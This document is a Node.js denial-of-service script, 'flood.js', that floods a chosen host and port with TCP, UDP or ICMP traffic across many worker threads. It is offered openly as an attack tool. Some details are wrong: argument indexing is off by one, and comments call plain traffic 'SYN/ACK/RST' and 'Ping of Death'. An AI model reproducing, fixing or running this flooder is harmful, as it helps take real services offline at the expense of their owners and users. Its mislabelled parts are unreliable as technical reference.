const net = require('net');
const dgram = require('dgram');
const raw = require('raw-socket');
const { Worker, isMainThread, parentPort } = require('worker_threads');
const crypto = require('crypto');

// Argument extraction
const args = {
    target: process.argv[1],
    port: parseInt(process.argv[2]),
    time: parseInt(process.argv[3]),
    method: process.argv[4].toUpperCase(),
    rate: parseInt(process.argv[5]) * 100,
    threads: parseInt(process.argv[6]) || 50
};

// Validation
if (!args.target || isNaN(args.port) || isNaN(args.time) || !args.method || isNaN(args.rate)) {
    console.log(`
    [🔥] Usage: node flood.js <target> <port> <time> <TCP/UDP/ICMP> <rate> [threads]
    Example: node flood.js 1.3.3.7 80 60 TCP 10 100
    `);
    process.exit(1);
}

console.log(`[⚡] Launching ${args.method} attack on ${args.target}:${args.port} for ${args.time}s @ ${args.rate}pps`);

// TCP Flood (SYN/ACK/RST)
function tcpAttack() {
    const payload = crypto.randomBytes(1024);
    for (let i = 0; i < args.threads; i++) {
        const client = new net.Socket();
        client.connect(args.port, args.target, () => {
            setInterval(() => {
                for (let j = 0; j < args.rate/args.threads; j++) {
                    client.write(payload);
                }
            }, 1);
        });
        client.on('error', () => client.destroy());
    }
}

// UDP Flood (Bandwidth killer)
function udpAttack() {
    const socket = dgram.createSocket('udp4');
    const payload = crypto.randomBytes(1024);
    setInterval(() => {
        for (let i = 0; i < args.rate/10; i++) {
            socket.send(payload, args.port, args.target, (err) => {
                if (err) console.log("[UDP ERROR]");
            });
        }
    }, 1);
}

// ICMP Flood (Ping of Death)
function icmpAttack() {
    const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
    const packet = Buffer.alloc(64);
    packet.writeUInt8(8, 0);  // ICMP Echo Request
    packet.writeUInt16BE(1, 2);  // Identifier
    
    setInterval(() => {
        for (let i = 0; i < args.rate/10; i++) {
            socket.send(packet, 0, packet.length, args.target, (err) => {
                if (err) console.log("[ICMP ERROR]");
            });
        }
    }, 1);
}

// Worker Thread Orchestration
if (isMainThread) {
    console.log(`[🛠️] Spawning ${args.threads} worker threads...`);
    for (let i = 0; i < args.threads; i++) {
        new Worker(__filename, { workerData: args });
    }
} else {
    switch(args.method) {
        case 'TCP': tcpAttack(); break;
        case 'UDP': udpAttack(); break;
        case 'ICMP': icmpAttack(); break;
        default: console.log("[❌] Invalid method. Use TCP/UDP/ICMP");
    }
}

// Attack Timer
setTimeout(() => {
    console.log("[✔️] Attack completed. Targets obliterated.");
    process.exit(0);
}, args.time * 1000);